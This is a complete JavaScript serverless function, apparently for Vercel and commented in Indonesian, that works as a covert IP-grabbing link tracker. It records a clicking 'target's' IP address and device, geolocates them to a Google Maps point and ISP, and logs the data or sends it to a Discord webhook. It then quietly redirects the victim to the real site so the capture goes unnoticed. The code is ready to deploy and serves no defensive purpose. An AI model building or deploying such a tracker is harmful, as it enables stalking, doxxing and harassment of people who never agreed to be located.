export default async function handler(req, res) {
  // 1. Tangkap URL Tujuan
  const targetUrl = req.query.url || 'https://google.com';

  // 2. Tangkap IP & Device/User-Agent target dari Vercel Header
  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1');
  const userAgent = req.headers['user-agent'] || 'Unknown Device';

  let geoData = {
    city: req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : 'Unknown',
    region: req.headers['x-vercel-ip-country-region'] || 'Unknown',
    country: req.headers['x-vercel-ip-country'] || 'Unknown',
    org: 'Unknown ISP',
    lat: '',
    lon: ''
  };

  // 3. AUTO-LOCATE IP (Mengambil Detail Koordinat & ISP)
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    if (geoRes.ok) {
      const data = await geoRes.json();
      if (!data.error) {
        geoData.city = data.city || geoData.city;
        geoData.region = data.region || geoData.region;
        geoData.country = data.country_name || geoData.country;
        geoData.org = data.org || 'Unknown ISP';
        geoData.lat = data.latitude;
        geoData.lon = data.longitude;
      }
    }
  } catch (err) {
    console.error("Geo fetch error:", err);
  }

  const mapLink = (geoData.lat && geoData.lon) 
    ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}` 
    : 'N/A';

  // 4. CATAT DATA KE LOG VERCEL DASHBOARD
  console.log(`================ [TARGET LOGGED] ================`);
  console.log(`IP Target  : ${ip}`);
  console.log(`Lokasi     : ${geoData.city}, ${geoData.region}, ${geoData.country}`);
  console.log(`ISP        : ${geoData.org}`);
  console.log(`Maps Link  : ${mapLink}`);
  console.log(`URL Tujuan : ${targetUrl}`);
  console.log(`Device     : ${userAgent}`);
  console.log(`=================================================`);

  // 5. DISCORD WEBHOOK (OPSIONAL - Kosongkan jika tidak pakai Discord)
  const DISCORD_WEBHOOK = ""; 

  if (DISCORD_WEBHOOK) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: "🚨 **TARGET DIKLIK LINK TRACKER!** 🚨",
          embeds: [{
            title: "🎯 Data Target Terperangkap",
            color: 15158332,
            fields: [
              { name: "IP Address", value: `\`${ip}\``, inline: true },
              { name: "ISP / Provider", value: geoData.org, inline: true },
              { name: "Lokasi Estimasi", value: `${geoData.city}, ${geoData.region}, ${geoData.country}`, inline: false },
              { name: "Google Maps Auto-Locate", value: mapLink !== 'N/A' ? `[Buka Peta Target](${mapLink})` : 'Tidak ditemukan', inline: false },
              { name: "URL Tujuan Target", value: targetUrl, inline: false },
              { name: "Device / User Agent", value: `\`${userAgent}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (e) {
      console.error("Failed sending to Discord:", e);
    }
  }

  // 6. AUTO REDIRECT TARGET KE WEB ASLI
  const destination = targetUrl.startsWith('http') ? targetUrl : `https://${targetUrl}`;
  res.redirect(302, destination);
}